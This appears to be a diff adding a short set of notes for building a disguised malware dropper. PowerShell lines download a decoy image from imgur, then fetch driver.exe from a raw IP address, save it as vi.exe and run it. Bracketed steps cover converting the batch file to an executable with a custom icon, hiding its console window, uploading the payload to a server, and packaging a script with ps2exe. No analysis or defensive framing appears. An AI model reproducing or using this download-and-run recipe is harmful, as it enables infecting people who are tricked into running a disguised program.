@@ -1,0 +1,13 @@
+(apache server)
+(login.ps1)
+Powershell -Command Invoke-WebRequest -Uri https://i.imgur.com/XoSe08F.jpg -OutFile test.png -UseBasicParsing
+test.png
+Powershell -Command Invoke-WebRequest -Uri http://13.53.200.24/driver.exe -OutFile vi.exe -UseBasicParsing
+Powershell -Command & "vi.exe"
+(set icon to batch file)
+(download bat to exe software)
+(set icon and 32 bit invisible)
+(upload server)
+(upload batch file and driver.exe on server)
+(Install-Module ps2exe)
+(Invoke-ps2exe .\monkey.ps1 .\monkey.exe -iconFile .\mon.ico -NoConsole)
